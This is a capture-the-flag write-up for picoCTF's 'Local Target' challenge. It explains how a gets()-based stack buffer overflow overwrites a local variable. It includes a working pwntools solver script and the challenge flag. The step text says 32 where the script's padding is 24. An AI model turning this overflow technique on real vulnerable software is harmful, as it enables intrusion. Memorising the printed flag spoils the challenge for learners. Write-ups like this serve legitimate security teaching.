# Local Target
> Write-up author: jon-brandy
## DESCRIPTION:
Smash the stack Can you overflow the buffer and modify the other local variable? 
The program is available here. You can view source here. And connect with it using: [YOUR NETCAT]

## HINT:
- Do anything you can to change num.
- When you change num, view the value as hexadecimal.

## STEPS:
1. After launched the instance, we have 2 files. The source code and it's binary.
2. Let's check the binary protections.

> 64 bit binary, No Canary, No PIE

![image](https://github.com/jon-brandy/CTF-WRITE-UP/assets/70703371/92b3fc5e-5e74-4ab1-93a7-3d688920cdd2)


3. Since we got the source code, hence no need to decompile it.
4. I ran static analysis and found a potential of BOF because the binary accepts input using gets() function.

![image](https://github.com/jon-brandy/CTF-WRITE-UP/assets/70703371/9292b99c-d85d-4c08-81a2-ddd3748a0f64)


5. And we need to change the value of `num` variable to 65 in order to get the flag.
6. So the concept here is overwriting stack variable using BOF.
7. Let's find the RBP offet using gdb.

> Sending 1024 bytes (overflowing the buffer, actually more than 16 is enough)

![image](https://github.com/jon-brandy/CTF-WRITE-UP/assets/70703371/1623c667-2756-4705-b19a-b543f26ba1ba)

> Get the offset

![image](https://github.com/jon-brandy/CTF-WRITE-UP/assets/70703371/61f1bea8-f41e-4377-99d0-086ab075614c)


8. The second offset is the RBP offset. Well we know our buffer hit the RBP at 32 bytes. Since it's a 64 bit binary, hence we need to Uminus(8) or plus by 8 the RBP offset to get the correct stack offset to overwrite the variable value.
9. Let's start by Uminus it --> 32.
10. Here's the solver:

```py
from pwn import * 
import os 

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a , **kw)
    else:
        return process([exe] + argv, *a, **kw)

exe = './local-target'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'debug'

sh = start()

padding = 24

p = flat([
    asm('nop') * padding,
    0x41 # 65 
])

sh.sendlineafter(b':', p)

get = sh.recvall()
info(get)
```

> TEST LOCALLY WITH LOCAL FLAG

![image](https://github.com/jon-brandy/CTF-WRITE-UP/assets/70703371/7ddfa272-f291-487a-960c-3af972227202)

11. Great! Now let's send the script remotely.

> RESULT

![image](https://github.com/jon-brandy/CTF-WRITE-UP/assets/70703371/4a6f19ea-3ff5-4e02-acb0-3286965e7f87)

12. Got the flag!

## FLAG:

```
picoCTF{l0c4l5_1n_5c0p3_ee58441a}
```

